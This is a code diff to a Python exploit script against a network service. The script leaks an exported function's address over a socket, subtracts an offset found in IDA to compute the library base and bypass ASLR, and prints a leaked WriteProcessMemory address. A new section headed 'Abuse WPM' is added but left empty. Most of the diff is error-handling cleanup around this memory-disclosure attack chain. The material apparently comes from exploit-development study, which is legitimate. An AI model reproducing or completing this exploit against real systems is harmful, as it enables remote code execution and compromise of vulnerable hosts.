@@ -241,14 +241,19 @@ def leakFunctionAddress(func, socketTup):
 
             if not response:
                 print(Fore.RED + "[-] No response received from server" + Style.RESET_ALL)
-                return 1
+                sys.exit(1)
 
             # Should have a valid response, parse it and get the address
             functionAddress = parseResponse(response)
             print(Fore.GREEN + f"o Found leaked address: 0x{functionAddress:08x}" + Style.RESET_ALL)
 
+            if functionAddress == 1:
+                print(Fore.RED + "[-] Failed to leak WriteProcessMemory address" + Style.RESET_ALL)
+                sys.exit(1)
+
             # Return the address only
             return functionAddress
+
     except socket.timeout:
         print(Fore.RED + "[-] Socket operation timed out" + Style.RESET_ALL)
         sys.exit(1)
@@ -323,6 +328,10 @@ def main():
 
     try:
 
+        # ************************************************************************************
+        # ******************************* ASLR Bypass Start***********************************
+        # ************************************************************************************
+
         # Get Addr of ExportFunction
         exportedFunc = leakFunctionAddress(b"SymbolOperationN98E_CRYPTO_get_new_lockid" + b"\x00", (server, port))
 
@@ -332,19 +341,15 @@ def main():
         # Target Function Offset observed from loading the dll in IDA was noted
         functionOffset = 0x14E0
 
-        # Can use the in memory address and preferred function offset to get
-        # the base address of the library
-        if exportedFunc == 1:
-            print(Fore.RED + "[-] Failed to leak exportedFunction address" + Style.RESET_ALL)
-            return 1
-
         libraryBase = exportedFunc - functionOffset
         print(Fore.GREEN + f"o Calculated library base: {str(hex(libraryBase))}\n" + Style.RESET_ALL)
         print(Fore.GREEN + f"o Leaked WriteProcessMemory address: {hex(WPMAddr)}\n" + Style.RESET_ALL)
 
-        if WPMAddr == 1:
-            print(Fore.RED + "[-] Failed to leak WriteProcessMemory address" + Style.RESET_ALL)
-            return 1
+        # ************************************************************************************
+        # ************************************ Abuse WPM *************************************
+        # ************************************************************************************
+
+     
 
     except KeyboardInterrupt:
         print(Fore.RED + "\n[!] User requested shutdown" + Style.RESET_ALL)
